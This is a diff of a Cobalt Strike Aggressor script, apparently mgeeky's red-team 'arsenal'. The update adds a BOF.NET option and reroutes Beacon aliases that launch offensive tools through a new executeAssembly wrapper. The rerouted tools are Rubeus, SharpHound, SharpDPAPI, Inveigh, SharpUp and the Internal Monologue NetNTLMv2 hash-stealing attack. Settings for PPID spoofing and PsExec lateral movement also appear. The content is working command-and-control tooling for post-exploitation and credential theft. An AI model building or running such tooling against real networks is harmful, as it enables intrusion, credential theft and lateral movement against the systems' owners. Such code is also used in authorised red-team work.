@@ -159,6 +159,10 @@
 #   - "Process name to spoof as parent in PPID"
 #   - "Service name(s) to use in PSExec lateral movement" - comma-separeted list of service names to be used
 #       by Cobalt Strike when doing jump psexec/psexec64
+#   - "When two inline execute-assembly BOF providers are available, prefer this one" - configures 
+#		inline-execute-assembly alias to use either inlineExecute-Assembly or ExecuteAssembly BOFs.
+#	- "If there is BOF.NET loaded, prefer it over execute-assembly" - if BOF.NET is loaded, do not use execute-assembly
+#       in arsenal's commands, but rather pick `bofnet_jobassembly`.
 #
 #
 # This Aggressor script stands on the shoulder of giants and uses their splendid work:
@@ -189,10 +193,10 @@
 #   - add more keyboard shortcuts(e.g. openWindowsExecutableStage())
 #
 # Author:
-#   Mariusz Banach / mgeeky, '19-'21
+#   Mariusz Banach / mgeeky, '19-'22
 #   <mb [at] binary-offensive.com>
 #   (https://github.com/mgeeky)
-#   v0.6
+#   v0.8
 #
 
 import java.net.URLEncoder;
@@ -299,6 +303,11 @@ $LOAD_ADPSMODULE    = getFileProper(script_resource("modules"), "Load-AdPsModule
 %arsenal::defaults["add_beacon_notes"] = "true";
 
 %arsenal::defaults["collect_domain_name"] = "false";
+
+#
+# If there's BOF.NET loaded in Cobalt Strike, prefer `bofnet_jobassembly` command over `execute-assembly` for commands exposed by arsenal.
+#
+%arsenal::defaults["favor_bofnet_instead_of_execute_assembly"] = "true";
 
 %arsenal::defaults["autorun_command_on_initial_checkin1"] = "";
 %arsenal::defaults["autorun_command_on_initial_checkin2"] = "";
@@ -600,7 +609,9 @@ sub arsenal::updateglobals {
     drow_text($dialog, "parent_process_name", "Process name to spoof as parent in PPID (and 'autoppid' command) - comma separates multiple entries: ");
     drow_text($dialog, "privileged_parent_process_name", "Process name to spoof as parent in PPID in PRIVILEGED Beacons (and 'autoppid' command): ");
     drow_text($dialog, "psexec_service_name", "Service name(s) to use in PSExec lateral movement (comma separated, will pick at random): ");
+    
     drow_combobox($dialog, "prefer_inline_execute_provider", "When two inline execute-assembly BOF providers are available, prefer this one: ", @available_inline_execute_assembly_bofs);
+    drow_checkbox($dialog, "favor_bofnet_instead_of_execute_assembly", "If there is BOF.NET loaded, prefer it over execute-assembly:", "Prefer bofnet_jobassembly");
 
     dbutton_action($dialog, "Update");
     dialog_show($dialog);
@@ -703,6 +714,7 @@ sub arsenal::saveoptions{
     %arsenal::defaults["beacon_tab_name_format"] = %options["beacon_tab_name_format"];
     %arsenal::defaults["add_beacon_notes"] = %options["add_beacon_notes"];
     %arsenal::defaults["prefer_inline_execute_provider"] = %options["prefer_inline_execute_provider"];
+    %arsenal::defaults["favor_bofnet_instead_of_execute_assembly"] = %options["favor_bofnet_instead_of_execute_assembly"];
 
     if(%options["existing_downloaded_files_overriding"] eq "Skip existing files") {
         %arsenal::defaults["existing_downloaded_files_overriding"] = 'skip';
@@ -1535,6 +1547,11 @@ sub constructClosure {
     return $closure;
 }
 
+#
+# Usage:
+#
+#	beacon_task($bid, $command);
+#
 sub beacon_task {
     local('$bid $func $cmdline $argc $closure $closure_text $cmd @args');
 
@@ -1702,7 +1719,7 @@ alias launch-inveigh {
     }
 
     btask($1, "Tasked beacon to launch Inveigh for $minutes minutes with parameters: $params");
-    bexecute_assembly!($1, $INVEIGH_PATH, $params);
+    arsenal::executeAssembly($1, $INVEIGH_PATH, $params);
 }
 
 alias launch-sharpup {
@@ -1713,7 +1730,7 @@ alias launch-sharpup {
         $params = substr($0, strlen("launch-sharpup "));
     }
 
-    bexecute_assembly($1, $SHARPUP_PATH, $params);
+    arsenal::executeAssembly($1, $SHARPUP_PATH, $params);
 }
 
 alias launch-sharpdpapi {
@@ -1724,7 +1741,7 @@ alias launch-sharpdpapi {
         $params = substr($0, strlen("launch-sharpdpapi "));
     }
 
-    bexecute_assembly($1, $SHARPDPAPI_PATH, $params);
+    arsenal::executeAssembly($1, $SHARPDPAPI_PATH, $params);
 }
 
 alias launch-sharpwmi {
@@ -1735,7 +1752,7 @@ alias launch-sharpwmi {
         $params = substr($0, strlen("launch-sharpwmi "));
     }
 
-    bexecute_assembly($1, $SHARPWMI_PATH, $params);
+    arsenal::executeAssembly($1, $SHARPWMI_PATH, $params);
 }
 
 alias launch-watson {
@@ -1746,7 +1763,7 @@ alias launch-watson {
         $params = substr($0, strlen("launch-watson "));
     }
 
-    bexecute_assembly($1, $WATSON_PATH, $params);
+    arsenal::executeAssembly($1, $WATSON_PATH, $params);
 }
 
 alias launch-seatbelt {
@@ -1757,7 +1774,7 @@ alias launch-seatbelt {
         $params = substr($0, strlen("launch-seatbelt "));
     }
 
-    bexecute_assembly($1, $SEATBELT_PATH, $params);
+    arsenal::executeAssembly($1, $SEATBELT_PATH, $params);
 }
 
 alias launch-rubeus {
@@ -1769,7 +1786,7 @@ alias launch-rubeus {
     }
 
     $params .= " /nowrap";
-    bexecute_assembly($1, $RUBEUS_PATH, $params);
+    arsenal::executeAssembly($1, $RUBEUS_PATH, $params);
 }
 
 alias launch-sharphound {
@@ -1790,12 +1807,12 @@ alias launch-sharphound {
     $params = $params . " -d $domain";
 
     btask($1, "Tasked beacon to collect BloodHound data: SharpHound.exe $params");
-    bexecute_assembly!($1, $SHARPHOUND_PATH, [$params trim]);
+    arsenal::executeAssembly($1, $SHARPHOUND_PATH, [$params trim]);
 }
 
 alias launch-monologue {
     btask($1, "Tasked beacon to retrieve NetNTLMV2 hashes using Internal Monologue attack.");
-    bexecute_assembly($1, $INTRNL_MONOLG_PATH, "");
+    arsenal::executeAssembly($1, $INTRNL_MONOLG_PATH, "");
 }
 
 alias launch-sharpshares {
@@ -1808,7 +1825,7 @@ alias launch-sharpshares {
         $params = substr($0, strlen("launch-sharpshares "));
     }
 
-    bexecute_assembly($1, $SHARPSHARES_PATH, $params);
+    arsenal::executeAssembly($1, $SHARPSHARES_PATH, $params);
 }
 
 alias inline-execute-assembly {
@@ -2288,6 +2305,13 @@ alias syncall {
     }
 }
 
+sub caseInsensitiveCompare
+{
+	$a = lc($1);
+	$b = lc($2);
+	return $a cmp $b;
+}
+
 alias execute-assembly {
     local('$bid $localpath $args $tmp $tmp2');
     $bid = shift(@_);
@@ -2338,7 +2362,40 @@ alias execute-assembly {
 
     btask($bid, "Tasked beacon to run .NET program: \c7" . getFileName($localpath) . " $args \o");
     arsenal::debug("augmented execute-assembly: bid='" . $bid . "', localpath='" . $localpath . "', args='" . $args . "'");
+
     bexecute_assembly!($bid, $localpath, $args);
+}
+
+sub arsenal::executeAssembly {
+    local('$bid $localpath $args $assemblyName $pos');
+
+	$bid = $1;
+	$localpath = $2;
+	$args = $3;
+
+	if(%arsenal::defaults["favor_bofnet_instead_of_execute_assembly"] eq "true") 
+	{
+	    $assemblyName = getFileName($localpath);
+	    $pos = lindexOf($assemblyName, ".");
+
+	    if($pos) {
+	    	$assemblyName = substr($assemblyName, 0, $pos);
+	    }
+
+	    $assemblyName = lc($assemblyName);
+
+		btask($bid, "Tasked beacon to run .NET program via bofnet_jobassembly \c7" . $assemblyName . " $args \o");
+	    arsenal::debug("augmented bofnet_jobassembly: bid='" . $bid . "', assemblyName='" . $assemblyName . "', args='" . $args . "'");
+
+	    beacon_task($bid, "bofnet_jobassembly $assemblyName $args");
+    }
+    else 
+    {
+	    btask($bid, "Tasked beacon to run .NET program: \c7" . getFileName($localpath) . " $args \o");
+	    arsenal::debug("augmented execute-assembly: bid='" . $bid . "', localpath='" . $localpath . "', args='" . $args . "'");
+
+	    bexecute_assembly!($bid, $localpath, $args);
+    }
 }
 
 sub arsenal::syncDownloadedFiles {
@@ -3022,7 +3079,7 @@ sub getOptions {
     }
 
     if(%arsenal::defaults["prefer_inline_execute_provider"] !in @supported_inline_execute_assembly_bofs) {
-    	show_error("Error while loading options: prefer_inline_execute_provider set with unsupported value! Reverting to default.");
+    	#show_error("Error while loading options: prefer_inline_execute_provider set with unsupported value! Reverting to default.");
 
     	%arsenal::defaults["prefer_inline_execute_provider"] = @supported_inline_execute_assembly_bofs[0];
     }
